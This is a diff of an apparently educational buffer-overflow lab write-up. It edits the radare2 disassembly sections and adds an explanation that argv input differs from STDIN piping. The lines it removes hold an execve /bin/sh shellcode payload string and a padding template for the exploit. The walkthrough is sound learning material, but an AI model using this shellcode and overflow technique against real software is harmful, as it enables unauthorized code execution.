@@ -1098,7 +1098,7 @@ The entrypoint for the main function is 0x00400564.
 
 Search for the main function (`s main`) and print (`pdf`) the main function:  
 
-```md
+```asm
 [0x00400450]> s main
 [0x00400564]> pdf
  51: int main (int argc, char **argv, char **envp);
@@ -1129,7 +1129,7 @@ The call to copy_arg function is  0x0040058b
 The entrypoint for the copy_arg function is 0x00400527.  
 Move to the entry point of the function (`:> s sym.copy_arg`) and print(`pdf`) the function.  
 
-```armasm
+```assembly
 [0x00400564]> s sym.copy_arg
 [0x00400527]> pdf
  61: sym.copy_arg (char *arg1);
@@ -1155,34 +1155,30 @@ Move to the entry point of the function (`:> s sym.copy_arg`) and print(`pdf`) t
 [0x00400527]> 
 ```
 
+First, attempt to identify the overflow point:
+
+```bash
+python -c "print('\x41' * 148)" | ./buffer-overflow
+```
+This commmand fails
+
+![Overflow](assets/buffer-overflow-15-task8-4.png)  
 
 
-This will move to the entry point of the copy_arg function, shown by the display of the memory address corresponding to the flagspace
+```c
+main(int argc, char **argv)  // ← Accepts command line arguments
+{
+    copy_arg(argv[1]);       // ← Directly passes first command line argument
+}
 
-![Function Entry Point](assets/buffer-overflow-15-task8-4.png)  
+// This means the program expects:
+$ ./program ARGUMENT_HERE
+//            ↑
+//         This becomes argv[1]
+```
 
-Print the function to learn more about what happens inside
+Conversely, the command enter pipes the string to STDIN, leaving argv[1] as NULL
 
-`:> pdf`  
-
-![copy_arg Function](assets/buffer-overflow-16-task8-5.png)  
-
-
-The modelf for the command, again: `python -c “print (NOP * no_of_nops + shellcode + random_data * no_of_random_data + memory address)”`  
-
-
-`python -c “print ("A" * 118 + "\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05" + "B" * 30 + memory address)”`
-
-
-
-## BUFFER OVERFLOW EXERCISE 2
-
-
-Use a Hex calculator to identify the difference.  
-
-In Hex value:
-00400527 – 00400450 = D7
-
-In Decimal value:
-4195623 – 4195408 = 215
-![Hex Math](/assets/buffer-overflow-17-task8-6.png)  
+```bash
+python -c "print('\x41' * 148)" | ./buffer-overflow
+```
